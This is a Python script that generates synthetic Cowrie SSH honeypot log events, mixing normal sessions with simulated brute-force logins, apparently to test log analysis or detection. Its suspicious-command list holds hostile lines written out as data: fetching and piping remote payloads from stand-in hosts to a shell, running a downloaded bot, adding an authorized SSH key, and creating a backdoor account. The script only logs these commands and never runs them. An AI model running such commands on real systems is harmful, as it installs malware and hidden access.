import os
import json
import os
import json
import time
import random
from datetime import datetime, timezone

OUT = os.getenv("OUT", "/cowrie/var/log/cowrie/cowrie.json")
COUNT = int(os.getenv("COUNT", "300"))          # nombre de sessions, pas de logs
MODE = os.getenv("MODE", "mixed")               # normal | suspicious | mixed

USERS_NORMAL   = ["user", "ubuntu", "pi", "testuser", "alice"]
USERS_SUSP     = ["root", "admin", "administrator", "oracle", "postgres", "test", "guest"]
COMMON_PASS    = ["123456", "admin", "password", "root", "oracle123", "123qwe"]

NORMAL_COMMANDS = [
    "pwd", "ls", "ls -la", "whoami", "id", "echo $PATH", "uptime", "df -h",
    "free -m", "cat /etc/hostname", "history", "exit"
]

SUSPICIOUS_COMMANDS = [
    "uname -a", "cat /etc/passwd", "cat /proc/cpuinfo", "wget http://evil.com/m.sh",
    "curl -fsSL http://malware.org/payload | sh", "chmod +x /tmp/*.sh",
    "cd /tmp; wget http://attacker.ru/bot; chmod +x bot; ./bot",
    "echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
    "useradd -m -s /bin/bash backdoor; echo backdoor:toor | chpasswd",
    "netstat -tuln", "ps aux | grep sshd", "who", "last", "find / -name *.php"
]

def now_iso():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

def write_event(ev):
    with open(OUT, "a", encoding="utf-8") as f:
        f.write(json.dumps(ev) + "\n")

def generate_session(session_id):
    src_ip = f"172.30.0.{random.randint(1, 254)}"
    session = f"session_{session_id:04d}"
    user = random.choice(USERS_NORMAL + USERS_SUSP)
    is_suspicious = (MODE == "suspicious") or (MODE == "mixed" and random.random() < 0.4)

    # Connexion
    write_event({
        "timestamp": now_iso(),
        "eventid": "cowrie.session.connect",
        "src_ip": src_ip,
        "session": session,
        "src_port": random.randint(1024, 65535)
    })

    # Tentatives de login (brute force simulée ou succès direct)
    attempts = random.randint(1, 8) if is_suspicious else 1
    for _ in range(attempts - 1):
        write_event({
            "timestamp": now_iso(),
            "eventid": "cowrie.login.failed",
            "src_ip": src_ip,
            "session": session,
            "username": user,
            "password": random.choice(COMMON_PASS + ["wrongpass123", "12345678"])
        })
        time.sleep(random.uniform(0.1, 1.2))

    success = not is_suspicious or random.random() < 0.7
    if success:
        write_event({
            "timestamp": now_iso(),
            "eventid": "cowrie.login.success",
            "src_ip": src_ip,
            "session": session,
            "username": user,
            "password": random.choice(COMMON_PASS) if is_suspicious else "userpass"
        })

        # Commandes dans la session
        nb_cmds = random.randint(3, 18) if is_suspicious else random.randint(1, 6)
        cmds = SUSPICIOUS_COMMANDS if is_suspicious else NORMAL_COMMANDS
        for _ in range(nb_cmds):
            cmd = random.choice(cmds)
            write_event({
                "timestamp": now_iso(),
                "eventid": "cowrie.command.input",
                "src_ip": src_ip,
                "session": session,
                "username": user,
                "input": cmd
            })
            time.sleep(random.uniform(0.3, 3.5))

    # Fin de session
    write_event({
        "timestamp": now_iso(),
        "eventid": "cowrie.session.disconnect",
        "src_ip": src_ip,
        "session": session
    })

def main():
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    for i in range(COUNT):
        generate_session(i)
        time.sleep(random.uniform(0.5, 4.0))  # pause entre sessions

if __name__ == "__main__":
    main()